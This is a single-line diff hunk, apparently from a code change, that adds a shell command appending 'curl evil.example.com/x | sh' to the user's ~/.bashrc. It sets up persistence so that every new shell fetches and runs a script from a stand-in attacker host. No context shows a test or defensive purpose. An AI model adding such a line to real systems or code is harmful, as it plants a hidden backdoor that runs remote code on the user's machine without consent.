@@ -1,0 +1,1 @@
+echo 'curl evil.example.com/x | sh' >> ~/.bashrc
